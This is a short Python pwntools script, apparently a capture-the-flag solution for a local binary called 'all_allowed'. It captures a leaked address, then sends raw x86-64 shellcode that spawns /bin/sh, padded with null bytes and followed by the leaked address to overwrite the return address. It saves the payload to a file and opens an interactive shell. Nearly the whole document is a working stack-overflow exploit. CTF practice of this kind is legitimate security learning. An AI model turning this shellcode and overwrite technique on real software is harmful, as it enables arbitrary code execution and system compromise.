from pwn import *

context.binary = binary = "./all_allowed"
context.update(arch="amd64", os="linux")

elf = ELF(binary)
rop = ROP(elf)

gs = """
 
"""


def start():
    """
    Start the exploit against the target.
    if args.GDB is set, then we will attach gdb to the process
    else we will run the process normally.

    example:
        python solve.py GDB # will attach gdb to the process
        python solve.py # will run the process normally
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Start the process
p = start()
# read untill the pattern b'number: ' consumed.
p.recvuntil(b"number: ")
leak = p.recvuntil(b"\n").strip()

print(leak)
target_address = int(leak, 16)
print(p64(target_address))

p.recvuntil(b"throwing: ")


print("Writing line")
p.writeline(str(112))

p.recvuntil(b"trash: ")
shell = b'\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x08\x00\x00\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00'
payload = shell +  b'\x00'*74 + p64(target_address)
print(payload)
file = open('payload.txt', 'wb')
file.write(payload)
file.close()
p.writeline(payload)

p.interactive()  # Switch to interactive mode